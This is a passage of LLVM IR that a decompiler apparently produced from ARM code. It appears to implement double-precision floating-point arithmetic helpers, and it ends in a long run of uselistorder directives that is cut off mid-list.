  %v4_1a70c = udiv i32 %v15_1a6dc, 536870912
  %v5_1a70c = or i32 %v4_1a70c, %v3_1a708
  %v3_1a710 = mul i32 %v15_1a6dc, 8
  %v3_1a714 = udiv i32 %v0_1a714, 16
  store i32 %v3_1a714, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a714, 16
  br i1 %tmp, label %dec_label_pc_1a71c, label %dec_label_pc_1a68c

dec_label_pc_1a71c:                               ; preds = %dec_label_pc_1a6fc
  %v1_1a71c = and i32 %v1_1a738.ph, 1048576
  %v2_1a71c = icmp eq i32 %v1_1a71c, 0
  br i1 %v2_1a71c, label %dec_label_pc_1a724, label %.thread11.loopexit

dec_label_pc_1a724:                               ; preds = %dec_label_pc_1a71c
  %v2_1a724 = or i32 %v2_1a738, %v1_1a738.ph
  store i32 %v2_1a724, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a68c.outer

dec_label_pc_1a734:                               ; preds = %.thread10
  store i32 %v15_1a6dc, i32* %r3.global-to-local, align 4
  store i32 %v3_1a6d8, i32* %r2.global-to-local, align 4
  %v1_1a734 = and i32 %v1_1a738.ph, 1048576
  %v2_1a734 = icmp eq i32 %v1_1a734, 0
  br i1 %v2_1a734, label %bb103, label %.thread11

bb103:                                            ; preds = %dec_label_pc_1a734
  %v3_1a738 = or i32 %v2_1a738, %v1_1a738.ph
  store i32 %v3_1a738, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1a71c
  store i32 %v3_1a710, i32* %r3.global-to-local, align 4
  store i32 %v5_1a70c, i32* %r2.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1a734, %bb103
  %v1_1a740 = add nsw i32 %v4_1a660, 515
  store i32 %v1_1a740, i32* %ip.global-to-local, align 4
  %v2_1a740 = icmp ugt i32 %v1_1a664, 252
  %v7_1a740 = icmp eq i32 %v1_1a664, 253
  %v2_1a744 = xor i1 %v7_1a740, true
  %v3_1a744 = and i1 %v2_1a740, %v2_1a744
  br i1 %v3_1a744, label %bb104, label %bb105

bb104:                                            ; preds = %.thread11
  %v6_1a744 = icmp ugt i32 %v1_1a740, 1791
  %v11_1a744 = icmp eq i32 %v1_1a740, 1792
  br label %bb105

bb105:                                            ; preds = %.thread11, %bb104
  %v1_1a748 = phi i1 [ %v7_1a740, %.thread11 ], [ %v11_1a744, %bb104 ]
  %v0_1a748 = phi i1 [ %v2_1a740, %.thread11 ], [ %v6_1a744, %bb104 ]
  %v2_1a748 = xor i1 %v1_1a748, true
  %v3_1a748 = and i1 %v0_1a748, %v2_1a748
  call void @__pseudo_cond_branch(i1 %v3_1a748, i32 ptrtoint (i32* @global_var_1a478.1366 to i32))
  %v0_1a74c = load i32, i32* %r5.global-to-local, align 4
  %v1_1a74c = load i32, i32* %r2.global-to-local, align 4
  %v2_1a74c = sub i32 %v0_1a74c, %v1_1a74c
  store i32 %v2_1a74c, i32* %ip.global-to-local, align 4
  %v3_1a74c = icmp uge i32 %v0_1a74c, %v1_1a74c
  %v9_1a74c = icmp eq i32 %v0_1a74c, %v1_1a74c
  br i1 %v9_1a74c, label %bb106, label %.thread12

bb106:                                            ; preds = %bb105
  %v1_1a750 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a750 = load i32, i32* %r3.global-to-local, align 4
  %v3_1a750 = sub i32 %v1_1a750, %v2_1a750
  store i32 %v3_1a750, i32* %ip.global-to-local, align 4
  %v4_1a750 = icmp uge i32 %v1_1a750, %v2_1a750
  %v10_1a750 = icmp eq i32 %v1_1a750, %v2_1a750
  br i1 %v10_1a750, label %bb107, label %.thread12

bb107:                                            ; preds = %bb106
  %v1_1a754 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a754 = urem i32 %v1_1a754, 2
  %v3_1a754 = icmp ne i32 %v2_1a754, 0
  %v4_1a754 = udiv i32 %v1_1a754, 2
  store i32 %v4_1a754, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb105, %bb106, %bb107
  %v1_1a758 = phi i1 [ %v3_1a74c, %bb105 ], [ %v4_1a750, %bb106 ], [ %v3_1a754, %bb107 ]
  %v0_1a758 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a758 = zext i1 %v1_1a758 to i32
  %v3_1a758 = add i32 %v2_1a758, %v0_1a758
  store i32 %v3_1a758, i32* %r1.global-to-local, align 4
  %v0_1a75c = load i32, i32* %r0.global-to-local, align 4
  %v1_1a75c = load i32, i32* %r4.global-to-local, align 4
  %v2_1a75c = and i32 %v1_1a75c, 4096
  %v3_1a75c = icmp ne i32 %v2_1a75c, 0
  %v4_1a75c = mul i32 %v1_1a75c, 1048576
  %v6_1a75c = add i32 %v4_1a75c, %v0_1a75c
  %v7_1a75c = zext i1 %v3_1a75c to i32
  %v8_1a75c = add i32 %v7_1a75c, %v6_1a75c
  store i32 %v8_1a75c, i32* %r0.global-to-local, align 4
  %v2_1a760 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a760, i32* %r4.global-to-local, align 4
  store i32 %v6_1a600, i32* %r5.global-to-local, align 4
  store i32 %v9_1a600, i32* %r6.global-to-local, align 4
  ret i32 %v8_1a75c

dec_label_pc_1a764:                               ; preds = %dec_label_pc_1a620
  %v1_1a764 = and i32 %v2_1a624, -2147483648
  %v4_1a768 = urem i32 %v1_1a60c, 1048576
  %v5_1a768 = or i32 %v1_1a764, %v4_1a768
  store i32 %v5_1a768, i32* %r0.global-to-local, align 4
  %v6_1a76c = add nsw i32 %v2_1a620, 1023
  store i32 %v6_1a76c, i32* %r4.global-to-local, align 4
  %v8_1a76c = sub nsw i32 0, %v2_1a620
  %v9_1a76c = and i32 %v6_1a76c, %v8_1a76c
  %v11_1a76c = icmp slt i32 %v2_1a620, -1023
  %v12_1a76c = icmp eq i32 %v6_1a76c, 0
  %v7_1a770 = icmp sgt i32 %v2_1a620, -1023
  br i1 %v7_1a770, label %bb108, label %bb109

bb108:                                            ; preds = %dec_label_pc_1a764
  %v10_1a770 = sub nsw i32 1024, %v2_1a620
  store i32 %v10_1a770, i32* %r5.global-to-local, align 4
  %v14_1a770 = and i32 %v10_1a770, %v6_1a76c
  %v16_1a770 = icmp slt i32 %v10_1a770, 0
  %v17_1a770 = icmp eq i32 %v6_1a76c, 2047
  br label %bb109

bb109:                                            ; preds = %dec_label_pc_1a764, %bb108
  %v2_1a778.in = phi i32 [ %v9_1a76c, %dec_label_pc_1a764 ], [ %v14_1a770, %bb108 ]
  %v1_1a778 = phi i1 [ %v11_1a76c, %dec_label_pc_1a764 ], [ %v16_1a770, %bb108 ]
  %v0_1a778 = phi i1 [ %v12_1a76c, %dec_label_pc_1a764 ], [ %v17_1a770, %bb108 ]
  %v2_1a778 = icmp slt i32 %v2_1a778.in, 0
  %v3_1a774 = xor i1 %v2_1a778, %v1_1a778
  %v4_1a774 = or i1 %v0_1a778, %v3_1a774
  br i1 %v4_1a774, label %bb111, label %bb110

bb110:                                            ; preds = %bb109
  %v9_1a77485 = mul i32 %v6_1a76c, 1048576
  %v10_1a77486 = or i32 %v9_1a77485, %v5_1a768
  store i32 %v10_1a77486, i32* %r0.global-to-local, align 4
  store i32 %v3_1a600, i32* %r4.global-to-local, align 4
  store i32 %v6_1a600, i32* %r5.global-to-local, align 4
  ret i32 %v10_1a77486

bb111:                                            ; preds = %bb109
  %v1_1a77c = or i32 %v5_1a768, 1048576
  store i32 %v1_1a77c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v1_1a784 = add nsw i32 %v2_1a620, 1022
  store i32 %v1_1a784, i32* @r4, align 4
  %v3_1a784 = sub nsw i32 -1023, %v2_1a620
  %v4_1a784 = and i32 %v6_1a76c, %v3_1a784
  %v5_1a784 = icmp slt i32 %v4_1a784, 0
  store i1 %v5_1a784, i1* @cpsr_v, align 1
  %v6_1a784 = icmp slt i32 %v2_1a620, -1022
  store i1 %v6_1a784, i1* @cpsr_n, align 1
  %v7_1a784 = icmp eq i32 %v6_1a76c, 1
  store i1 %v7_1a784, i1* @cpsr_z, align 1
  %v1_1a788 = call i32 @function_1a478(i32 %v1_1a77c)
  store i32 %v1_1a788, i32* %r0.global-to-local, align 4
  %v0_1a78c = load i32, i32* @r5, align 4
  %v1_1a78c = load i32, i32* @r6, align 4
  %v2_1a78c = or i32 %v1_1a78c, %v0_1a78c
  store i32 %v2_1a78c, i32* @lr, align 4
  %v1_1a790 = call i32 @function_1a478(i32 %v1_1a788)
  store i32 %v1_1a790, i32* %r0.global-to-local, align 4
  %v0_1a794.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1a798.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a794

dec_label_pc_1a794:                               ; preds = %.thread1, %.thread2, %bb93, %bb111
  %v4_1a794.pre-phi = phi i32 [ %v5_1a610, %.thread1 ], [ %.pre148.pre-phi, %.thread2 ], [ %v5_1a610, %bb93 ], [ %v5_1a610, %bb111 ]
  %v0_1a798 = phi i32 [ %v5_1a60c, %.thread1 ], [ %v5_1a60c, %.thread2 ], [ %v5_1a60c, %bb93 ], [ %v0_1a798.pre, %bb111 ]
  %v2_1a79c = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb93 ], [ %v0_1a794.pre, %bb111 ]
  %v5_1a794 = and i32 %v2_1a79c, %v4_1a794.pre-phi
  store i32 %v5_1a794, i32* @r5, align 4
  %v4_1a798 = icmp eq i32 %v2_1a79c, %v0_1a798
  br i1 %v4_1a798, label %bb112, label %bb113

bb112:                                            ; preds = %dec_label_pc_1a794
  %v5_1a79c = icmp eq i32 %v5_1a794, %v2_1a79c
  br label %bb113

bb113:                                            ; preds = %dec_label_pc_1a794, %bb112
  %v0_1a7a0 = phi i1 [ false, %dec_label_pc_1a794 ], [ %v5_1a79c, %bb112 ]
  call void @__pseudo_cond_branch(i1 %v0_1a7a0, i32 ptrtoint (i32* @global_var_1a5f4.1367 to i32))
  %v0_1a7a4 = load i32, i32* @r4, align 4
  %v1_1a7a4 = load i32, i32* %ip.global-to-local, align 4
  %v4_1a7a4 = icmp eq i32 %v1_1a7a4, %v0_1a7a4
  br i1 %v4_1a7a4, label %dec_label_pc_1a7ac, label %dec_label_pc_1a7c8

dec_label_pc_1a7ac:                               ; preds = %bb113
  %v0_1a7ac = load i32, i32* @r1, align 4
  %v1_1a7ac = load i32, i32* %r0.global-to-local, align 4
  %v4_1a7ac = mul i32 %v1_1a7ac, 4096
  %v5_1a7ac = or i32 %v4_1a7ac, %v0_1a7ac
  store i32 %v5_1a7ac, i32* %r4.global-to-local, align 4
  %v1_1a7b0 = icmp ne i32 %v5_1a7ac, 0
  call void @__pseudo_cond_branch(i1 %v1_1a7b0, i32 ptrtoint (i32* @global_var_1a5f4.1367 to i32))
  %v0_1a7b4 = load i32, i32* @r5, align 4
  %v1_1a7b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a7b8 = icmp ne i32 %v1_1a7b4, %v0_1a7b4
  call void @__pseudo_cond_branch(i1 %v1_1a7b8, i32 ptrtoint (i32* @global_var_1a5dc.1368 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1a7c4 = call i32 @function_1a5f4(i32 %arg3, i32 %arg4)
  store i32 %v2_1a7c4, i32* %r0.global-to-local, align 4
  %v1_1a7c8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a7c8

dec_label_pc_1a7c8:                               ; preds = %bb113, %dec_label_pc_1a7ac
  %v1_1a7c8 = phi i32 [ %v1_1a7a4, %bb113 ], [ %v1_1a7c8.pre, %dec_label_pc_1a7ac ]
  %v0_1a7c8 = load i32, i32* @r5, align 4
  %v4_1a7c8 = icmp eq i32 %v0_1a7c8, %v1_1a7c8
  br i1 %v4_1a7c8, label %dec_label_pc_1a7d0, label %dec_label_pc_1a7c8.dec_label_pc_1a7e4_crit_edge

dec_label_pc_1a7c8.dec_label_pc_1a7e4_crit_edge:  ; preds = %dec_label_pc_1a7c8
  %v1_1a7e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a7e4

dec_label_pc_1a7d0:                               ; preds = %dec_label_pc_1a7c8
  %v4_1a7d0 = mul i32 %arg3, 4096
  %v5_1a7d0 = or i32 %v4_1a7d0, %arg4
  store i32 %v5_1a7d0, i32* %r5.global-to-local, align 4
  %v7_1a7d0 = icmp eq i32 %v5_1a7d0, 0
  call void @__pseudo_cond_branch(i1 %v7_1a7d0, i32 ptrtoint (i32* @global_var_1a590.1369 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1a7e0 = call i32 @function_1a5f4(i32 %arg3, i32 %arg4)
  store i32 %v2_1a7e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a7e4

dec_label_pc_1a7e4:                               ; preds = %dec_label_pc_1a7c8.dec_label_pc_1a7e4_crit_edge, %dec_label_pc_1a7d0
  %v1_1a7e4 = phi i32 [ %v1_1a7e4.pre, %dec_label_pc_1a7c8.dec_label_pc_1a7e4_crit_edge ], [ %v2_1a7e0, %dec_label_pc_1a7d0 ]
  %v0_1a7e4 = load i32, i32* @r1, align 4
  %v3_1a7e4 = mul i32 %v1_1a7e4, 2
  %v4_1a7e4 = or i32 %v3_1a7e4, %v0_1a7e4
  store i32 %v4_1a7e4, i32* %r6.global-to-local, align 4
  %v6_1a7e4 = icmp eq i32 %v4_1a7e4, 0
  br i1 %v6_1a7e4, label %dec_label_pc_1a7e4._crit_edge, label %bb114

dec_label_pc_1a7e4._crit_edge:                    ; preds = %dec_label_pc_1a7e4
  %.pre = mul i32 %arg3, 2
  %.pre80 = or i32 %.pre, %arg4
  br label %bb115

bb114:                                            ; preds = %dec_label_pc_1a7e4
  %v4_1a7e8 = mul i32 %arg3, 2
  %v5_1a7e8 = or i32 %v4_1a7e8, %arg4
  store i32 %v5_1a7e8, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1a7e8, 0
  br label %bb115

bb115:                                            ; preds = %dec_label_pc_1a7e4._crit_edge, %bb114
  %v4_1a7f8.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1a7e4._crit_edge ], [ %v5_1a7e8, %bb114 ]
  %v0_1a7ec = phi i1 [ false, %dec_label_pc_1a7e4._crit_edge ], [ %phitmp, %bb114 ]
  call void @__pseudo_cond_branch(i1 %v0_1a7ec, i32 ptrtoint (i32* @global_var_1a528.1370 to i32))
  %v0_1a7f0 = load i32, i32* @r1, align 4
  %v1_1a7f0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a7f0 = mul i32 %v1_1a7f0, 2
  %v4_1a7f0 = or i32 %v3_1a7f0, %v0_1a7f0
  store i32 %v4_1a7f0, i32* %r4.global-to-local, align 4
  %v1_1a7f4 = icmp ne i32 %v4_1a7f0, 0
  call void @__pseudo_cond_branch(i1 %v1_1a7f4, i32 ptrtoint (i32* @global_var_1a5dc.1368 to i32))
  store i32 %v4_1a7f8.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1a7fc = icmp ne i32 %v4_1a7f8.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1a7fc, i32 ptrtoint (i32* @global_var_1a590.1369 to i32))
  %v0_1a800 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a800 = load i32, i32* @r1, align 4
  %v2_1a800 = call i32 @function_1a5f4(i32 %v0_1a800, i32 %v1_1a800)
  store i32 %v2_1a800, i32* %r0.global-to-local, align 4
  ret i32 %v2_1a800

; uselistorder directives
  uselistorder i32 %v5_1a7e8, { 1, 0, 2 }
  uselistorder i32 %v1_1a7a4, { 1, 0 }
  uselistorder i32 %v10_1a770, { 2, 0, 1 }
  uselistorder i32 %v6_1a76c, { 3, 4, 0, 1, 2, 6, 5, 7 }
  uselistorder i32 %v5_1a768, { 1, 0, 2 }
  uselistorder i32 %v2_1a750, { 1, 0, 2 }
  uselistorder i32 %v1_1a750, { 1, 0, 2 }
  uselistorder i32 %v1_1a74c, { 1, 0, 2 }
  uselistorder i32 %v0_1a74c, { 1, 0, 2 }
  uselistorder i1 %v7_1a740, { 1, 0 }
  uselistorder i32 %v2_1a724, { 1, 0 }
  uselistorder i32 %v3_1a710, { 2, 1, 0 }
  uselistorder i32 %v3_1a704, { 0, 2, 1 }
  uselistorder i32 %v5_1a700, { 2, 0, 1 }
  uselistorder i32 %v6_1a6f0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1a6dc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1a6d8, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1a6e4, { 0, 2, 1 }
  uselistorder i32 %v1_1a6f0, { 1, 0 }
  uselistorder i32 %v6_1a6d4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1a6c0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1a6bc, { 0, 2, 1 }
  uselistorder i32 %v0_1a6c8, { 0, 2, 1 }
  uselistorder i32 %v1_1a6d4, { 1, 0 }
  uselistorder i32 %v6_1a6b8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1a6a4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a6ac, { 0, 2, 1 }
  uselistorder i32 %v1_1a6b8, { 1, 0 }
  uselistorder i32 %v3_1a69c, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1a690, { 1, 2, 0 }
  uselistorder i32 %v3_1a71013, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1a70c17, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1a690, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1a69c, { 1, 0 }
  uselistorder i32 %storemerge136, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1a738.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1a67c, { 1, 0 }
  uselistorder i32 %v0_1a680, { 1, 0 }
  uselistorder i32 %v3_1a66c, { 1, 0 }
  uselistorder i1 %v1_1a660, { 1, 0 }
  uselistorder i32 %v3_1a650, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1a64c, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1a644, { 2, 1, 0 }
  uselistorder i32 %v5_1a640, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1a620, { 1, 5, 6, 4, 2, 3, 0, 7, 10, 9, 8, 11 }
  uselistorder i32 %v6_1a610, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1a610, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1a60c, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1a60c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1a600, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 6, 7, 1, 3, 4, 5, 8, 2 }
  uselistorder i32* %r0.global-to-local, { 21, 16, 18, 2, 4, 17, 14, 5, 19, 20, 15, 6, 3, 7, 8, 11, 9, 10, 12, 13, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 10, 9 }
  uselistorder i32 (i32, i32)* @function_1a5f4, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_1a478, { 1, 0 }
  uselistorder i1* @cpsr_n, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 1024, { 2, 0, 14, 15, 3, 16, 1, 17, 18, 19, 5, 12, 13, 4, 8, 9, 7, 10, 6, 11, 20 }
  uselistorder i32 -1023, { 2, 0, 1, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 2, 1, 14, 15, 16, 17, 20, 25, 26, 27, 24, 31, 29, 30, 28, 22, 18, 19, 0, 23, 3, 21 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 1, 6, 4, 5, 7, 8, 29, 9, 10, 2, 11, 12, 96, 97, 98, 0, 99, 100, 13, 14, 101, 102, 15, 103, 104, 105, 106, 71, 72, 116, 117, 37, 38, 39, 124, 40, 125, 126, 41, 127, 128, 42, 129, 130, 131, 132, 133, 134, 107, 111, 112, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 108, 43, 83, 34, 66, 44, 63, 94, 64, 118, 119, 135, 32, 113, 114, 84, 85, 86, 87, 88, 89, 59, 109, 110, 65, 16, 115, 31, 17, 18, 19, 20, 21, 22, 30, 23, 24, 3, 25, 26, 35, 48, 49, 67, 68, 69, 70, 50, 45, 46, 51, 90, 91, 52, 47, 53, 92, 93, 60, 61, 54, 62, 95, 33, 36, 55, 120, 121, 27, 122, 56, 123, 28, 57, 58 }
  uselistorder i32 8, { 3, 4, 5, 6, 7, 8, 59, 60, 30, 9, 10, 21, 11, 120, 121, 122, 123, 0, 1, 124, 125, 126, 127, 128, 12, 129, 67, 52, 53, 61, 130, 131, 132, 133, 27, 134, 82, 153, 164, 43, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 44, 135, 83, 84, 85, 86, 87, 88, 89, 90, 91, 13, 45, 92, 37, 93, 94, 62, 95, 96, 97, 136, 137, 138, 181, 31, 68, 14, 119, 150, 69, 70, 42, 157, 156, 154, 155, 72, 73, 74, 158, 159, 160, 161, 162, 163, 15, 147, 148, 2, 180, 48, 49, 46, 47, 23, 24, 34, 35, 50, 182, 98, 139, 140, 99, 100, 63, 101, 102, 103, 104, 28, 105, 56, 57, 106, 107, 108, 51, 109, 110, 111, 112, 33, 25, 26, 113, 114, 58, 141, 142, 71, 143, 144, 29, 145, 146, 16, 17, 64, 32, 18, 19, 22, 20, 75, 76, 77, 78, 79, 80, 54, 81, 115, 116, 55, 117, 118, 41, 40, 39, 65, 66, 38, 36, 149, 151, 152 }
  uselistorder i32 4, { 8, 9, 179, 260, 261, 180, 10, 11, 117, 118, 119, 271, 272, 273, 274, 275, 276, 277, 0, 12, 78, 278, 279, 280, 281, 282, 283, 284, 76, 285, 120, 121, 122, 286, 287, 99, 288, 88, 289, 13, 14, 1, 253, 213, 214, 215, 216, 217, 290, 291, 292, 100, 123, 124, 125, 126, 127, 128, 295, 129, 130, 303, 304, 101, 131, 15, 218, 16, 98, 89, 90, 17, 348, 91, 80, 18, 19, 92, 93, 349, 350, 351, 352, 94, 353, 354, 355, 356, 95, 357, 358, 359, 360, 361, 20, 362, 363, 364, 365, 366, 96, 79, 367, 368, 369, 370, 371, 372, 21, 22, 97, 297, 298, 102, 219, 220, 221, 222, 103, 223, 224, 225, 226, 227, 77, 228, 229, 230, 231, 232, 296, 233, 373, 374, 375, 377, 378, 132, 133, 134, 322, 323, 324, 325, 23, 193, 135, 194, 136, 81, 195, 262, 137, 263, 264, 2, 313, 314, 315, 316, 138, 139, 196, 140, 3, 141, 197, 24, 198, 82, 142, 143, 328, 330, 329, 326, 327, 199, 200, 201, 202, 331, 332, 333, 334, 335, 336, 337, 338, 339, 144, 145, 146, 147, 305, 306, 307, 308, 309, 310, 4, 25, 311, 376, 234, 26, 27, 28, 29, 5, 320, 30, 148, 66, 31, 32, 203, 149, 33, 150, 151, 152, 153, 154, 235, 34, 236, 155, 237, 238, 239, 240, 241, 242, 243, 156, 244, 245, 246, 247, 248, 249, 67, 252, 157, 158, 251, 181, 250, 299, 300, 104, 301, 302, 293, 294, 35, 36, 84, 37, 38, 85, 340, 341, 182, 39, 40, 41, 42, 68, 43, 204, 44, 45, 69, 46, 47, 159, 48, 205, 105, 206, 106, 207, 208, 209, 210, 211, 212, 49, 50, 160, 255, 254, 256, 257, 86, 259, 51, 258, 87, 107, 52, 70, 112, 183, 161, 162, 163, 164, 111, 165, 166, 109, 184, 110, 53, 167, 108, 54, 185, 186, 187, 188, 189, 190, 191, 116, 55, 56, 83, 168, 265, 266, 267, 268, 269, 270, 113, 312, 169, 317, 170, 71, 72, 57, 318, 58, 59, 114, 73, 171, 115, 60, 61, 74, 172, 319, 173, 75, 174, 175, 62, 321, 63, 64, 65, 342, 343, 344, 345, 346, 347, 176, 177, 178, 6, 7, 192 }
  uselistorder i32 32, { 57, 58, 59, 60, 28, 29, 36, 49, 50, 31, 61, 30, 37, 62, 63, 64, 65, 34, 66, 81, 82, 83, 0, 84, 85, 51, 93, 95, 38, 39, 32, 67, 43, 20, 68, 69, 54, 55, 4, 3, 6, 5, 8, 7, 1, 33, 88, 86, 87, 70, 19, 71, 2, 44, 72, 73, 74, 75, 76, 21, 77, 52, 53, 89, 90, 91, 92, 96, 45, 56, 46, 35, 78, 79, 80, 10, 9, 22, 40, 47, 94, 23, 12, 11, 14, 13, 24, 16, 15, 25, 26, 18, 17, 27, 41, 42, 48 }
  uselistorder i32 33, { 3, 4, 5, 2, 6, 7, 8, 1, 0, 9 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 16777216, { 1, 2, 0, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 39, 37, 40, 38, 43, 41, 44, 42, 46, 45, 48, 47, 50, 49, 52, 51 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 154, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 146, 66, 67, 151, 68, 152, 69, 153, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 147, 1, 82, 83, 86, 85, 84, 89, 88, 87, 90, 91, 92, 93, 94, 95, 155, 96, 97, 98, 145, 103, 99, 100, 104, 101, 102, 105, 106, 111, 107, 108, 110, 109, 112, 114, 113, 148, 115, 149, 117, 116, 118, 119, 120, 123, 121, 122, 124, 125, 126, 128, 127, 129, 130, 131, 134, 132, 133, 135, 136, 138, 137, 139, 140, 141, 142, 143, 144, 150 }
  uselistorder i32 1048576, { 19, 0, 1, 2, 20, 21, 13, 3, 4, 5, 22, 6, 7, 23, 24, 14, 15, 8, 9, 25, 26, 27, 18, 28, 10, 16, 11, 17, 12 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 14, 54, 55, 56, 57, 58, 59, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 11, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 1, 0, 18, 19, 20, 21, 22, 143, 2, 144, 145, 146, 147, 148, 149, 150, 60, 3, 61, 62, 63, 151, 155, 154, 156, 157, 158, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 4, 75, 76, 77, 78, 79, 80, 81, 216, 221, 107, 108, 23, 24, 25, 109, 110, 111, 112, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 213, 214, 215, 187, 188, 5, 189, 190, 191, 192, 193, 194, 198, 13, 199, 200, 6, 82, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 83, 84, 85, 86, 87, 88, 89, 90, 159, 160, 161, 162, 163, 7, 12, 164, 36, 8, 37, 38, 165, 9, 166, 167, 91, 92, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 15, 16, 17, 93, 94, 95, 96, 52, 53, 217, 218, 219, 220, 168, 169, 170, 171, 10, 172, 173, 174, 175, 152, 153, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 195, 196, 197 }
  uselistorder i32* @r5, { 86, 87, 88, 30, 89, 90, 91, 92, 93, 94, 95, 96, 39, 40, 97, 41, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 201, 202, 203, 204, 205, 206, 207, 8, 208, 209, 210, 211, 212, 213, 214, 5, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 27, 42, 9, 3, 43, 231, 235, 232, 233, 234, 23, 240, 236, 237, 238, 239, 241, 242, 243, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 10, 120, 121, 244, 248, 11, 250, 249, 4, 251, 12, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 280, 279, 25, 281, 193, 194, 195, 196, 197, 198, 323, 324, 122, 123, 124, 125, 126, 127, 128, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 129, 0, 130, 131, 132, 133, 134, 135, 337, 338, 339, 340, 1, 341, 342, 343, 184, 185, 186, 187, 188, 189, 44, 45, 46, 47, 48, 49, 50, 199, 13, 7, 200, 51, 52, 55, 56, 57, 58, 59, 60, 61, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 190, 191, 192, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 